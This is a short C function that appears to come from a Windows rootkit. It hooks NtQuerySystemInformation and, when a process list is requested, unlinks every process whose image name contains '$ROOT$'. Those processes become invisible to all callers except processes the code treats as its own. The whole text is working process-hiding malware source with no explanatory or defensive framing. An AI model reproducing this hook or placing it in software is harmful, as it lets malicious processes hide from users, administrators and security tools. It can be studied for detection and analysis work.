NTSTATUS HookNtQuerySystemInformation(ULONG InfoClass,PVOID Buffer,ULONG Length,PULONG ReturnLength)
{
    PSYSTEM_PROCESS_INFO pCurr,pNext;
    NTSTATUS ret;
 
    if(InfoClass!=5)
    {
        return fnNtQuerySystemInformation(InfoClass,Buffer,Length,ReturnLength);
    }
 
    ret=fnNtQuerySystemInformation(InfoClass,Buffer,Length,ReturnLength);
 
    if(IsRootProcess())
    {
        return ret;
    }
 
    if(NT_SUCCESS(ret))
    {
        pCurr=NULL;
        pNext=(PSYSTEM_PROCESS_INFO)Buffer;
 
        while(pNext->NextEntryOffset!=0)
        {
            pCurr=pNext;
            pNext=(PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr+pCurr->NextEntryOffset);
 
            if(wcsstr(pNext->ImageName.Buffer,L"$ROOT$"))
            {
                if(pNext->NextEntryOffset==0)
                {
                    pCurr->NextEntryOffset=0;
                }
 
                else
                {
                    pCurr->NextEntryOffset+=pNext->NextEntryOffset;
                }
 
                pNext=pCurr;
            }
        }
    }
 
    return ret;
}